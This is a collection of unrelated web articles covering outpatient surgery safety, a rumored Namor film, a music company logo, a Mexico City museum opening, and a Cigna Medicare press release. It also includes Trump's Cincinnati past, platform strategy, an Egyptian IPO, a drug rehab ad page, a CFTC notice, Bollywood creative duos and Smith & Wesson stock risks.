An increasing number of surgeries are being performed outside of hospitals, in outpatient surgical centers, and those facilities have gotten a lot of praise for offering lower prices than hospitals. But a lengthy investigation by Kaiser Health News finds that they’re often unsafe or ill-equipped to handle patients’ needs.
The findings:
Since 2013, more than 260 patients have died after outpatient surgeries, including “dozens” who died after routine procedures like colonoscopies.
Surgery centers are also taking on increasingly complex procedures. Medicare began allowing them to perform certain spinal procedures in 2015; 14 patients have died shortly after receiving one of those procedures at an outpatient surgery center.
In just a two-year period, Medicare cited 122 surgery centers for failing to properly assess patients’ risk of complications. Inspectors discovered another 230 problems with equipment or training — just since 2015.
The other side: “There is nothing distinct or different about the surgery center model that makes the provision of health care any more dangerous than anywhere else,” Bill Prentice, chief executive of the Ambulatory Surgery Center Association, tells KHN.

Could The Namor Movie Be Coming In 2016?
Posted by Brendon Connelly May 15, 2014 Comment
Right now, Universal Pictures still hold the rights to Namor, one of Marvel’s prodigal stars. I know that many would like to see him return to the fold, and Daredevil lapsing at Fox proves that it could happen, but it’s just as likely, if not more so, that Universal will get a film into production before their option is over.
So… are they revving it up now? Latino Review believe that they might just be, and indicate the possibility that it will be released on November 4th, 2016.
Legendary Pictures, who are now a funding and development partner with Universal, and definitely comic book lovers into the bargain, have set out that date for an as-yet untitled “event picture.”
There’s even some blind guesswork that there’s a script for this film already and that it’s been shown to Zac Efron. He does have the look, I suppose. Or at least the sideburns.
So… maybe Namor is coming soon, maybe he isn’t. For now, there’s not much to go on, but I do think it’s all-but inevitable that Universal will give the big wet fella a movie sooner rather than later.

This Brand Is Tickled Pink, Literally
Steve Olenski,
Contributor
Apr. 3, 2014, 3:19 PM
The use of colors in a given brand's logo is a topic that is often discussed and debated with the impact those colors can have from a marketing and advertising perspective at the top of the priority list.
A lot of thought goes into, or at least it should, the color or colors of a given brand's logo for each color can serve to represent differing traits or characteristics. For example, according to the Logo Design Guru, black can represent authority, power and mystery.
Red on the other hand can convey passion, love and anger whereas yellow can connote a sense of happiness and warmth and blue professionalism, trust and authority.
As for the color pink, that represents feminism, innocence, youth and beauty — at least according to the self-proclaimed Logo Design Guru.
Let the Music Play
However, based on the logo of one music publishing company, who according to their CEO Josh Gruss, is comprised of "very experienced and savvy music-business-minded individuals" — you can also add words such as harmonic and melodic and of course, musical.
The company is Round Hill Music and their logo color choice clearly connotes the aforementioned words while also helping garner it some attention for sure based if nothing else, on the fact that it's hot pink.
But the logo, which was created by design agency Established, also has another visual aspect to it, one that is anything but a coincidence. A piece of tape. Yes, tape.
Gruss explains why "We thought, 'what is the common thing that is always present?' Aside from people and instruments, it's tape. Tape is used by every musician to hold their picks to their instruments or microphone stands, to fix a set list during a gig to the floor, to hold down cables, to be placed on their snare or other drums, label something on a gig bag or rack case, and so on. This is who we are-- we are the company that holds it all together from a music rights perspective. We are secure and can be helpful in various situations. Musicians always need to make sure they have the proper support- that is what tape is. That is who and what Round Hill Music is."
Apparently they're taking this whole tape thing very seriously with Gruss adding "as tape can be different shapes and sizes, we brand each of our staff with their own unique piece of tape which can be seen on each individual's business card and email signature."

Billionaire Slim opens art museum in Mexico City

In Mexico City Tuesday night, Carlos Slim, the richest man in the world, opened the Soumaya Museum alongside an entourage as eclectic his art collection: TV legend Larry King, Colombian novelist and Nobel laureate Garcia Marquez, and Mexican President Felipe Calderon.
The museum, named in honor of Slim's late wife, Soumaya, is in the upscale Polanco neighborhood and will display 60,000 of the tycoon's art pieces. The building was designed by Mexican architect Fernando Romero, Slim's son-in-law. (See a picture.)
The aluminum-encased asymmetrical building houses several Rodin sculptures, works by El Greco, Rubens, Monet, Renoir and Degas as well as murals by Mexican muralists Rufino Tamayo and Diego Rivera. The museum will open to the public later this month, entrance is free of charge.
Slim originally made his fortune in telecommunications and is worth $53.5 billion, according to Forbes magazine.
Hundreds of Calderon's security detail -- known here as the Estado Mayor -- swarmed the vast block that makes up Plaza Carso (short for Carlos and Soumaya).
To everyone's surprise, King kicked off the event by taking off his blazer and showing his trademark suspenders. Slim was one of the last big interviews on Larry King Live before King's retirement last year.
"I love this country and I love this city," said King while standing at the podium in an apparent PR effort to counter the murder and mayhem headlines coming out of Mexico these days.
Calderon, who spoke after King and Slim, thanked King in English for his comments. But it was Slim who had the last word.
"I want fine art at the reach of Mexicans who can't travel abroad," he said.

Cigna is the only Medicare Advantage HMO plan in Arizona to receive a 5-star rating from the Centers for Medicare & Medicaid Services
Cigna will offer an enhanced premium plan for Medicare beneficiaries in Phoenix and Tucson in 2016
Cigna's HMO/POS plan is the top-rated commercial plan in Arizona with a 4 out of 5 rating, according to NCQA's Private Health Insurance Plan Ratings 2015-2016

CMS's Five-Star Quality Rating System rates Medicare Advantage plans on a scale of 1 to 5 stars, 5 being the highest, as a way to help consumers judge the quality and customer service of Medicare Advantage plan choices. Cigna's Medicare Advantage plans in Arizona have achieved a 4.5 out of 5 star rating from CMS for the last four consecutive years. No other Medicare Advantage HMO plan in the state of Arizona has a higher rating than Cigna HealthCare of Arizona.
Cigna will capitalize on its strong performance in the Medicare market by offering health, prescription drug, special needs and an enhanced premium plan in Phoenix for 2016. New this year, plans will also be offered in Tucson for 2016.
"Cigna's comprehensive benefit plans are designed to meet our customers' individual health care needs," said Rebecca Lindy, market manager and chief operations officer for Cigna HealthCare of Arizona Medicare Advantage Plan. "For the 2016 enrollment season, we will offer an enhanced premium plan for Medicare customers who may be looking for additional benefits, such as dental, transportation coverage to physician appointments and reimbursements for joining a fitness center."
Cigna Medicare Advantage beneficiaries have access to a broad network of primary care physicians and specialists, including Cigna Medical Group (CMG), a group practice division of Cigna HealthCare of Arizona. CMG is one of the Valley's largest multi-specialty group practices with 23 health care centers located throughout metropolitan Phoenix.
All plans offer extra benefits not covered under Original Medicare and are designed to help beneficiaries better manage their health and limit out-of-pocket medical expenses. Medicare beneficiaries can enroll in Cigna 2016 plans during the annual election period, which begins Oct. 15, 2015. Cigna is hosting seminars across the Valley about plan options for 2016. To find a seminar location or learn about plan details, please call toll free 1-855-561-3811 (TTY 711) seven days a week from 8 a.m. to 8 p.m. or visit www.cignamedicare.com/az.
Additionally, earlier this fall, Cigna's HMO/POS plan was recognized by the National Committee for Quality Assurance (NCQA) as the top-rated commercial plan in Arizona with a 4 out of 5 rating, according to NCQA's Private Health Insurance Plan Ratings 2015-2016. The ratings compare the quality and services of more than 1,000 health plans and are based on the measurement of a health plan's performance in three categories: customer satisfaction, prevention and treatment.
"By working together with health care professionals and customers, we have a unique insight into a customer's health that affords us the opportunity to tailor solutions that can have the greatest impact on health and wellness," said Edward Kim, president and general manager for Cigna in Arizona. "The designations from CMS and NCQA underscore the value we can help deliver to our customers at every stage of their lives."

It's difficult to imagine a quiet Donald Trump, who Saturday called presidential rival Ohio Governor John Kasich a "baby" at a campaign rally in Dayton and who has shouted down his opponents at debates.
But a maintenance man who worked with Donald and Fred Trump when they owned a Bond Hill apartment complex remembered the young billionaire as a quiet person and a "nice, presentable young man."
As the battle for the Republican nomination turns Ohio - the primary is Tuesday - Trump has trotted out the story of his Cincinnati connections in speech after speech, including Saturday's rally in Dayton and the March 5 rally in Orlando, Florida.
He recalled his summer in Cincinnati saying “I worked as a young guy in Swifton Village in Cincinnati, and I think we're going to do fantastically in Ohio. I love that state." He may tell the story again Sunday in West Chester, where he plans a 2 p.m. rally.
Enquirer archives tell the story of how New York developer Fred Trump bought a troubled Bond Hill complex known as Swifton Village in 1962, located on land now called the Villages of Daybreak.
Cincinnati Enquirer | cincinnati.com
Roy Knight, who worked maintenance at Swifton Village in the 1960s, remembered the father and son always visited the 1,200-unit complex on Tuesdays to supervise its revitalization. In the eight years under Trump ownership, occupancy in the complex rose from 66 percent to 100 percent.
"He sent his son, 25-year-old business school whiz Donald Trump, to Cincinnati to manage the property," the Enquirer archives note.
“When they bought this place from the government, there were 400 units rented and 800 vacant. In less than two years, there wasn't a vacancy,” Knight recalled in 1990.

He said Donald Trump “wasn't skilled,” but often flew in for a few days at a time to help with landscaping and other menial duties around the complex.
Trump was a "nice, presentable young man," Knight said. "He didn't joke or make the fool."
Fred Trump bought Swifton Village for $5.7 million after it had been repossessed by the Federal Housing Administration. In Donald Trump's book "The Art of the Deal" he recalled how he discovered the project.
"In college, while my friends were reading the comics and the sports pages of newspapers, I was reading the listings of FHA foreclosures," Trump wrote. "And that's how I found out about Swifton Village."
The Trumps eventually sold the complex in 1972 and it was later known as Huntington Meadows. Today it's the Villages of Daybreak in Bond Hill, part of an effort to revitalize the neighborhood. Enquirer reporter Mark Curnutte previously wrote on the complex's history - with a cameo by Trump.

4 reasons why you should consider a platform strategy
Platforms from which to deliver products and services can be very profitable ways to gain market share and build customer loyalty. Any CIO involved in developing a digital strategy for a new product launch should consider whether a platform could be part of the mix.

The term platform is frequently cited in tech circles but often misunderstood. Google, Facebook and Amazon are the platform giants of the 21st century but what exactly is a platform, and should your company be building one? Like most questions, the answer is, "It depends" but if you are looking to expand your user base, build closer relationships with suppliers and want to make it more difficult for competitors to take market share then you should at least consider a platform strategy.
When designed and executed correctly a platform can be a cost-effective way to scale your enterprise and build a sustainable and profitable business. As Accenture recently pointed out, the top 15 publicly quoted platform companies represent $2.6 trillion in market capitalization.
1. Benefit from network effects
One of the key reasons that platforms such as Google, Facebook, Amazon and eBay have been so successful is that they have exploited the phenomena often referred to by economists as network effects. At a basic level, network effects explain how the value of a network or a service becomes disproportionately more valuable to its users the more users there are.
[ Beware the 9 warning signs of bad IT architecture and see why these 10 old-school IT principles still rule. | Sign up for CIO newsletters. ]
For example, a social network offers greater value to new and current users as new individuals sign up and increase the potential number of connections available. Not many people wanted a fax machine when there were few other fax machines to send and receive messages from but as the user base expanded the value in having a fax machine increased. If you can get network effects on your side by building a platform that is able to exploit them, you will create a powerful and positive fly wheel effect.
2. Make it more difficult for your competitors
A 2-sided platform that brings buyers and suppliers together can be a powerful way to keep competitors out of your market or, at the very least, make it more difficult for them to succeed. Uber has been able to do this in many large cities. Although the company has competitors, Lyft for example, it would be very difficult for a new entrant to overtake them in places where they are well established. A defensible market reduces the need to consistently spend large amounts on marketing as higher barriers to entry can be more effective than expensive advertising campaigns.
The downside to this for society more generally is the tendency for some platform companies to become too successful and turn into de facto monopolies. The recent call by US Senator, Elizabeth Warren, for the breakup of Amazon, Google and Facebook shows how platform strategies can attract unwelcome attention if they become too large.
3. Cost-effective value creation
At the end of the day, business is about delivering value to customers and receiving payment in return. In a 2-sided platform such as Facebook, that payment may be attention and eyeballs from consumers and advertising dollars from businesses. The key point is that the 2 sides of these platforms provide value to each other with the platform owner acting as an intermediary.
[ Looking to upgrade your career in tech? This comprehensive online course teaches you how. ]
Digital businesses lend themselves to this type of business model as they can be started with relatively little investment and scale effectively as demand grows. From the perspective of the platform owner, this is an attractive proposition as they can leverage these low-cost inputs. eBay, Uber and Airbnb have been able to grow so quickly because they do not need to carry any inventory or invest in infrastructure beyond that required to build the platform. The core value they add is trust, both from the suppliers that they will be paid and from users that the service or product will be delivered by the supplier. Review systems and refund guarantees reinforce the trust in the platform.
4. Keep your customers close
The principle of trying to lock customers is long-established. Gillette pioneered it with razor blades; once a customer has bought a Gillette razor handle, they are locked in to buying the company’s blades unless they switch to a competitor’s product. This also applies in the app economy. Having your app on a user’s home screen significantly raises retention rates and reduces customer churn.
Apple has very successfully created an ecosystem of hardware and software around the iPhone that, the longer a user is retained the harder it is for them to leave. When your photos and files are backed up in the iCloud and your playlists are all on Apple Music the less likely you are to invest the time in migrating to Android and moving your files to that platform. So long as your platform is delivering value to users, the more secure your user base is with all the benefits that brings for platform owners in terms of customer acquisition costs.
The economic benefits of being able to execute a platform strategy as part of your business model are clear. Investors are more likely to be attracted to a startup that promises to build a platform from which future innovations can be launched. However, platforms are not just for startups; established businesses should consider whether a platform strategy might be a good way to evolve existing product and service lines. Microsoft is doing this very successfully with its Office software as well as its Azure platform. Perhaps you should consider it too.

Sarwa Capital to list on EGX by end-Q3
Partial exit, capital increase worth $150m; Beltone Financial serving as financial adviser, Matouk Bassiouny legal adviser

Sarwa Capital intends to offer a share of its capital on the Egyptian Exchange (EGX) at the end of the third quarter (Q3) of this year to finance a capital increase and partial exit of some of its major shareholders, with a total value of $150m
Sarwa Capital hired Beltone Financial Holding as the sole financial adviser and bookrunner, while Matouk Bassiouny will serve as the legal adviser.
The company is expected to submit its registration documents to the Egyptian Financial Regulatory Authority (FRA) at the end of July or in early August.
A source told Daily News Egypt that Beltone initiated the pre-IPO roadshow for the company’s shares. The offering will be promoted after setting the fair value for the company’s shares, which will follow selecting the independent financial adviser.
The offering will allocate 85% of the offering to institutions in a private placement and 15% in a public offering for individuals.
Hazem Mousa, the company’s chief executive, disclosed earlier this month that the company intends to invest EGP 200m in two licenses for insurance activity, one for asset insurance and the other for life insurance, after receiving preliminary approval from the FRA.
The ownership structure of the company is divided between the Egyptian American Enterprise Fund (EAEF) as the largest shareholder with a 72% stake, and the management team, comprised of Hazem Mousa, Amr Lamy, and Hussam Abu Gendia, as well as other investors with a 28% stake.
Sarwa Capital has been active in a number of financial sectors, notably securitisation. The company has conducted securitisation worth EGP 10bn since 2005, along with some operations in consumer finance, leasing, mortgage, and insurance.

Congressional Intern Screams ‘F*** You!’ At President Trump At Capitol
By Joseph Curl
@josephcurl
June 20, 2018
Some people's kids, amirite?
A young female, reportedly a congressional intern, yelled “Mr. President, f**k you!” as President Trump entered the Capitol rotunda on Tuesday night for a meeting with lawmakers about problems at the U.S.-Mexico border.
The profane outburst was caught on video by a Fox News reporter.
Congressional aide or intern yells “Mr President, f*%k you!” from across the Capitol Rotunda as he walks to the Speaker’s office before mtg with House GOPers on immigration. Gets attention of USCP/Secret Service pic.twitter.com/5Uarw4FTsw
— Chad Pergram (@ChadPergram) June 19, 2018
"The woman who heckled the President most likely had to either be an intern or aide. Someone with a hard Congressional pass allowing access to the Rotunda area after hours. The Capitol closes to public tours ar 4:30 pm et," Pergram said in another tweet.
Frank Thorpe, a reporter for NBC, also captured the scream. “LISTEN: As Pres Trump’s entourage entered Speaker Ryan’s office in the Capitol, someone on the other side of the Capitol rotunda yelled: “Mr. President, F—k you!!” (He entered about 15 seconds later):”…”Per our intern, who was standing there, the woman who yelled “Mr. President, F–k you!!” was a congressional intern.”

Per our intern, who was standing there, the woman who yelled "Mr. President, F--k you!!" was a congressional intern.
— Frank Thorp V (@frankthorp) June 19, 2018
"A reporter from Politico said that Capitol Police were on the lookout for a 'young white woman' who had been wearing an intern badge," the New York Post wrote.
One reporter ran a humorous poll about the incident:
What will happen first for the congressional intern who yelled "F*** you" at Trump?

Today is the first day of school. I cannot believe it!
I have a third grader, Kindergartner and a preschooler. It will take awhile before we get into the swing of things... but I seriously hope I will get there SOON! Working 7 days straight with 5 kids threw me off. We were just in survival mode last week. I thank my husband and grandparents for being there when I was gone. They kept the house running. My husband even took care of 7 children (our own five + my niece and nephew) Friday night knowing I was still on call and had to leave early Saturday morning.
The older three are pretty excited for school! I hope that excitement continues -- since we all know how chaotic morning routines are, just to get everybody out of the house.
I have so many photos in my big camera that I just downloaded last night. i want to post them but not sure when that will be....The computer will have to be put away when children are awake. They saw me last week in front of a computer catching up on work every single night.
Have a good back-to-school week!

Sarrell drops lawsuit against Univ. of Ala. professor
By DrBicuspid Staff
July 22, 2011 -- Sarrell Dental is dropping its slander lawsuit against a professor at the University of Alabama at Birmingham School of Dentistry (UABSOD), perhaps signaling the end of a 15-month dispute with the school and the Alabama Dental Association (ALDA).
Sarrell Dental Center, a nonprofit organization, is the largest single provider of Medicaid dental services in Alabama.
During a January 2010 meeting of dental association trustees, members expressed concern about an uneven playing field with regard to nonprofit clinics competing with private practitioners, and they discussed trying to get legislation passed to control nonprofits.
Participants at the meeting were concerned that opposition to Sarrell would be viewed negatively by local communities served by the clinics. Steve Mitchell, DMD, director of UABSOD's pediatric dentistry department, warned about the consequences in "the court of public opinion," according to meeting transcripts. He had worked at a Sarrell clinic and helped organize students to treat children.
Based on comments from the meeting, Sarrell filed a slander lawsuit against Dr. Mitchell in March 2010.
In April 2010, the UAB dental school decided to remove its students from the Sarrell clinics, where they had been getting hands-on clinical training -- a move Sarrell CEO Jeffrey Parker said was due to a turf battle with private practitioners and pressure from alumni dentists. But the university said the students were taken out of training rotation at the Sarrell clinics due to a lack of proper faculty supervision.
The U.S. Federal Trade Commission subsequently launched an investigation into whether the ALDA engaged in unfair competition or deceptive acts by allegedly refusing to deal with Sarrell.
Sarrell then filed a lawsuit against the ALDA, claiming the organization had launched an "illegal conspiracy" to drive the clinic out of business.
In June 2011, Sarrell dropped its lawsuit against the ALDA after legislation was approved that exempts nondentists from oversight by the Alabama Board of Dental Examiners.
Parker called said the decision to drop the slander suit against Dr. Mitchell a "goodwill gesture."
"Steve Mitchell's painful, untrue words have caused enough embarrassment to him and his employer, and they are written into history by the Internet," Parker said in an email to DrBicuspid.com. "Those people who are important to the future of the practice of dentistry in Alabama know the truth of the situation, and that is enough for us. We have no desire to personally bankrupt Dr. Mitchell or to cause harm to any Alabama dental organization or university."
Opened in 2005, Sarrell now has 11 clinics, staffed by 52 dentists and 27 hygienists. The company saw revenues of $2.3 million in 2006 and is on track to reach $15 million this year, according to Parker.

Drug Treatment Lake Charles
At Drug Rehabilitation Facility Lake Charles we get that Drug addiction and Alcoholism are issues that will totally ruin the life of any individual afflicted with addiction. It is all too often that normal use of drugs or alcohol turns into chronic consumption and addiction. Their are no defined boundaries when it comes to addiction. Drug Addiction can happen to anyone, affect anyone in certain circumstances. However, just as anyone can become addicted to substances, they can also beat addiction when finding the right treatment.
In our current environment, illegal substances exist in all of our day to day lives. Substances such as liquor, oxycontin, meth and many other addictive drugs are not hard to find in most areas we live and play. These kinds of drugs and alcohol, when used chronically over a long period of time, become tolerance and addiction. Once anybody has formed a hard core addiction, it can be very hard to stop using on their own.
We at Drug Rehabilitation Center Lake Charles understand that there is no premeditated decision on the part of anyone to become addicted to drugs and alcohol. We also know that anybody that is destroying their life because of drugs wants to be free from addiction and clean up their life. We get that each and everyone of these people deserve a chance to receive the help that they are in need of.
Detoxification at Drug Rehab Program Lake Charles
After a person has consumed an addictive drug over an extended amount of time, a dependence develops for the drug. When dependence or addiction has developed it could be dangerous to abruptly stop using the drug without the assistance of a professional through a medical detoxification process. Addictive substances such as alcohol, ecstasy, meth, fentanyl and others can cause a variety of withdrawal symptoms such as agitation, anxiety, muscle aches, insomnia, sweating, vomiting and more.
At Drug Rehab Center Lake Charles we provide the needed medical assistance to make our clients as comfortable as possible in the withdrawal process. We provide 24/7 care during this very important first step in the recovery process. Our clients typically state that they feel a real sense of accomplishment when they have finished the detox process.
Long Term Treatment goals
At Drug Treatment Center Lake Charles we know that the most important factor in determining success is whether the person has truly overcome their addiction to drugs and alcohol. Success can only be calculated by the patient's belief in their ability to remain drug free. Short term rehab programs commonly fall short of this goal.
We know that it is very important not to be under time restraints while in treatment. The time that you spend in treatment can provide a lifetime of sobriety, it is well worth the investment of whatever time that it needs. We locate the underlying issues that may be at the root of the addiction. We will help you to repair the damages that you have created in your life so that you are not filled with disappointment. You will be taught life skills, coping skills and relapse prevention techniques so that you are not only sober when you leave, but know how to stay clean and sober for the rest of your life. We know that you want your life back and we are here to help you find a way to achieve it.
Relapse Prevention
At Drug Rehab Lake Charles we teach our patients drug addiction relapse prevention techniques to help those who have suffered with the serious issue of drug addiction to make a plan to stop substance use in the future. Drug addiction relapse prevention techniques are necessary when it comes to drug and alcohol addiction recovery. Individuals need to know different tools and steps they can take to guarantee their hard work of substance abuse recovery lasts for the rest of their lives. Drug and alcohol addiction can be a persistent chronic relapsing situation if the person is not equipped with the ability to prevent further relapses. This is why rehabilitation must have changes in attitudes and goals, which is all part of relapse prevention. Because of these issues, rehabilitation is not a single situation; it is an evolving process. Relapse happens when attitudes and behaviors revert to ones similar to those exhibited when the individual was consistently using drugs or alcohol. Although relapse may happen at any time, it is usually more likely earlier in the rehabilitation process. At this stage, habits and attitudes required for sobriety, techniques required to replace substance use, and identity with positive peers are not confidently set in stone. With the use of relapse prevention skills taught at our Drug Rehabilitation Lake Charles facility, our clients have a much greater chance at long term rehabilitation without chronically relapsing.

Agencies provide a heading for each part, subpart, section, and appendix that they are proposing to amend. The Amendment Part section identifies changes or additions to the CFR. The regulatory text of a document must fit into the current text of the CFR. It should precisely identify and describe the changes made to the CFR. The amendatory language uses standard terms to give specific instructions on how to change the CFR. It does not include a discussion of why the changes are made. If a document amends only certain sections within a CFR part, the authority citation for the part will set out as the first numbered item in the list of amendments for the part.
For more information please see the Document Drafting Handbook sections on the use of the Amendment Part section in Federal Register documents.

AGENCY:
Commodity Futures Trading Commission.
ACTION:
Notice of availability of terms and conditions of proposed commodity futures and options contracts.
SUMMARY:
The Chicago Mercantile Exchange (CME or Exchange) has applied for designation as a contract market in futures and options on five year agency notes and ten year agency notes. The proposals were submitted under the Commission's 45-day Fast Tract procedures. The Acting Director of the Division of Economic Analysis (Division) of the Commission, acting pursuant to the authority delegated by Commission Regulation 140.96, has determined that publication of the proposals for comment is in the public interest, will assist the Commission in considering the views of interested persons, and is consistent with the purpose of the Commodity Exchange Act.
DATES:
Comments must be received on or before February 24, 2000.
ADDRESSES:
Interested persons should submit their views and comments to Jean A. Webb, Secretary, Commodity Futures Trading Commission, Three Lafayette Centre, 1155 21st Street, NW Washington, DC 20581. In addition, comments may be sent by facsimile transmission to facsimile number (202) 418-5521, or by electronic mail to secretary@cftc.gov.

End Further Info End Preamble Start Supplemental Information
SUPPLEMENTARY INFORMATION:
The proposed designation applications were submitted pursuant to the Commission's Fast Track procedures for streamlining the review of futures contract rule amendments and new contract approvals (62 FR 10434). Under those procedures, the proposals, absent any contrary action by the Commission, may be deemed approved at the close of business on March 13, 2000, 45 days after receipt of the proposals. In view of the limited period under the Fast Track procedures, the Commission has determined to publish for public comment notice of the availability of the terms and conditions for 15 days, rather than 30 days as provided for proposals submitted under the regular review procedures.
Copies of the terms and conditions will be available for inspection at the Office of the Secretariat, Commodity Futures Trading Commission, Three Lafayette Centre, 1155 21st Street NW, Washington, DC 20581. Copies of the proposed amendments can be obtained through the Office of the Secretariat by mail at the above address, by phone at (202) 418-5100, or via the internet on the CFTC website at www.cftc.gov under “What's New & Pending”.
Other materials submitted by the CME in support of the applications for contract market designation may be available upon request pursuant to the Freedom of Information Act (5 U.S.C. 552) and the Commission's regulations thereunder (17 CFR Part 145 (1997)), except to the extent they are entitled to confidential treatment as set forth in 17 CFR 145.5 and 145.9. Requests for copies of such materials should be made to the FOI, Privacy and Sunshine Act Compliance Staff of the Office of Secretariat at the Commission's headquarters in accordance with 17 CFR 145.7 and 145.8.
Any person interested in submitting written data, views, or arguments on the proposed amendments, or with respect to other materials submitted by the CME, should send such comments to Jean A. Webb, Secretary, Commodity Futures Trading Commission, Three Lafayette Centre, 1155 21st Street NW, Washington, DC 20581 by the specified date.

7 Directors-Partners duo who have been successful in creating magic
September 14, 2018 Amrit Singh
It will not be inviting too much of a debate If we say that the biggest evolution in Indian cinema has come in the past two decades when the new generation of filmmakers almost created audiences of their own by giving them fresh content in their own style.
Here’s a list of new age directors who have been the face of this change and the partners who helped them achieve with their collaboaration. The pillars who helped them do so in the form of partners, colleagues, admirers/fans, Friends and at times their own family members.
Farhan, Zoya with Javed Akhtar
Consider Farhan, the director and take yourself back to Dil Chahta Hai and Lakshya. Would the movie feel the same without the words “Dil Chahta Hai…. Kabhi na beete Chamkeele din” or imagine Lakshya without the motivating Title track.
Then there is Zoya with her iconic ZNMD, the movie that beats up a jar of vitamins when it comes to boost you up and makes you feel good. Refreshing are the songs in the movie but nobody can think of the movie without the iconic words written by Javed Akhtar which were narrated by Imran played by Farhan in the movie.
Father Javed undoubtedly has inspired both Zoya and Farhan to become better filmmakers by making them understand what fine words can do to a movie.
Anurag Basu and Pritam
After movies like BARFI and JAGGA JASOOS it is clear that Anurag is one of the few movie makers of modern times who dares to experiment and has his own style of narrating a story. His bong brother Pritam da has helped him musically achieve his creativity levels with the finest compositions.
It wont be exaggeration if one says that Pritam has created his finest songs while working with Anuraag Basu. This duo has been so symbiotic in their partnership that they have always inspired each other to explore their arts to the fullest.
VISHAL B and Gulzar
Vishal Bharadwaj has done some great work adapting Shakespeare’s famous works in his movies and when one is attempting to recreate what Shakespeare did, you definitely need brilliant writers around you and Vishal B had exactly that in the form of Gulzar.
Chemistry between these two is incredible and they have together come up with the most iconic songs of modern times from ‘Beedi” to “namak isq ka”
And then from “dhan te nan” to “bismil”. Gulzar saahab once said that the relation and bonding he has with Vishal is similar to what he used to have with Pancham.
Gulzar has had a very important role in Vishal Bhardwaj’s success for sure.
Rakesh and Hrithik Roshan
Rakesh Roshan before launching Hrithik was an established Bollywood filmmaker but after the success of Kaho na Pyaar hai the Father-son duo have exhibited the immense confidence in each other which has been the motivator for them to do more.
Although Indian cinema has not been a fan of Super hero movies in the past but Rakesh Roshan changed that.He launched the Greek God Hrithik as the masked super hero Krishh and we all loved him.
R Balki and Amitabh Bachchan
R Balki has been one of the very few directors in the modern era who has been making great films without any apparent grandeur in their scripts.And while doing that R Balki has been utilizing Amit Ji’s talent to the fullest in his Old age.
Inspired by his wit was his character in Cheeni Kum, then Balki again did the unbelievable by coming up with a script which suited real life Father-son to play Son-father in PAA and in Shamitabh Balki has beautifully used Big B’s iconic voice with an amazing script.
Shoojit Sircar and Juhi Chaturvedi
Very few of Shoojit Sircar fans know that Juhi Chaturvedi has been the backbone of the gems of movies that he has been coming up one after the other especially since Madras cafe was loved and appreciated by one and all.
Starting from Vicky Donor, Juhi has been writing movies on human emotions and simplicity/complexities of relationships of all kind ranging from Vicky (Ayushmann) to Dr. Chaddha (Anu kapoor) to Bhaskor (Big B) and Piku (Deepika) and most recently Juhi’s pen and Shoojit mastery with his direction together pulled off the unimaginable Love story in October.
Karan Johar, SRK & Kajol
Yash Chopra has been the man who defined love and romance for decades in Indian cinema hands down. But Karan Johar re-defined Love in the modern age.
Taking the most iconic Romantic couple of Bollywood SRK and Kajol,he taught us as “Pyaar dosti hai”.With changing time, he brought us the love along with family bonding in K3G. The love story he brought us in My Name is Khan, was his best treatment to the subject.

How Risky Is Smith & Wesson Holding Corp?
Demand for guns may be the biggest factor in how well this firearms maker performs.
Rich Duprey
(TMFCop)
Dec 12, 2016 at 8:32AM
Smith & Wesson has enjoyed outsized demand for its guns and accessories, but there may be hurdles that it finds difficult to surmount. Image source: Kyle Post, via Flickr.
Gunmaker Smith & Wesson Holding (NASDAQ:AOBC) has lost 27% of its value since the November elections, as concerns about demand have grown. But now that Smith & Wesson trades at a 33% discount to the all-time high price of $31 a share it hit this summer, is its stock too risky to touch? Here's a look at the risks the gunslinger faces, and whether it can be a safe play over the long run.
SWHC data by YCharts.
Gun-buyer demand risk
Obviously the biggest risk Smith & Wesson faces is whether demand for its firearms can maintain its torrid pace. It can't be overstated just how hot gun sales have been over the past few years. Even if FBI background checks on gun buyers remain flat in December -- a highly unlikely event since there's only been one time that December checks weren't higher than November's -- the total for all of 2016 will surpass last year's record number by 18%. Let's just say it's a good bet the growth rate is going to be even higher than that.
Yet the election of Donald Trump to the presidency last month also hit a pressure-release valve on the gun market. It's long been argued the threat of more gun control under President Obama (and the potential for it under a President Clinton) kept the accelerator pinned to the floor on gun sales.
While other equally plausible reasons for robust gun sales have been put forward, the drop in value that Smith & Wesson's stock suffered after the election suggests the market puts more credence in the former rationale than in arguments about rising fears for personal safety.
Despite both Smith & Wesson and industry peer Sturm, Ruger (NYSE:RGR) saying they see no letup in demand for firearms, until they're proven right, doubts about demand sustainability will serve as a lid on their shares.
Image source: Vlad Butsky via Flickr.
Regulation risk
The November election removed what could have been a severe threat to Smith & Wesson's future. With a Supreme Court vacancy to be filled, a different candidate could have appointed a justice who might have undermined gun-ownership rights. The late Justice Antonin Scalia was a firm believer in private gun ownership, and one of his most important decisions was District of Columbia v. Heller, which enshrined the Constitution's protection of the right to own a firearm. Trump campaigned on appointing someone to the court who would continue to uphold those values, so there seems little worry the Supreme Court will overturn those laws.
Moreover, Republican control of both houses of Congress indicates that no legislation will be enacted at the federal level to infringe on Second Amendment rights, either. From a regulatory standpoint, then, there seems little risk, though states could still individually try to limit access.
Diversification risk
Unlike Sturm, Ruger -- essentially a firearms pure play -- Smith & Wesson has branched out into extreme outdoors gear and equipment through its purchase of Battenfeld Technologies. The gunmaker has used the acquisition to scoop up a handful of small suppliers this year that play into that field, including knife maker Taylor Brands and survival-gear maker Ultimate Survival Technologies. Smith & Wesson has said it will be making even more acquisitions in this direction, and that introduces some uncertainty for investors.
Brand extensions, or even going vertically as Smith & Wesson did with its acquisition of laser-sight maker Crimson Trace, are always viable options to pursue. But Smith & Wesson is veering off into a new field with its attempt to become a big player in the extreme outdoors market.
Sporting goods is a $60 billion industry that's four times larger than the firearms market, so there is room for the gun manufacturer to grow, and others are doing it too: Vista Outdoors (NYSE:VSTO) is both a sporting-goods company and a maker of rifles and shotguns through its Savage Arms division. But because this will be a wholly new kind of business for Smith & Wesson, it could encounter problems as it feels its way along.
Image source: Getty Images.
Consumer confusion risk
In conjunction with its push into sporting goods and to reflect that new focus, Smith & Wesson has proposed changing its name to American Outdoor Brands. While it will continue to manufacture its firearms under the Smith & Wesson brand, it wants to hide behind a broader, blander corporate umbrella. After all, when you hear the name "Vista Outdoors" you don't think of the guns it makes, so when Trump won the presidency, Vista's stock hardly budged. By changing its name, Smith & Wesson might be able to remove some of the volatility that surrounds its stock, but it also risks burying a storied and well-respected brand that is also one of its strongest selling points. I think it's ultimately a bad decision, but let's call this one a toss-up.
So how risky is Smith & Wesson?
Although the gunmaker has had some of the risks it's faced doused by external events, others, including the biggest hurdle, remain before it. It's likely Smith & Wesson's stock will remain depressed until the company can demonstrate the demand it believes is still present, and people buy its guns.
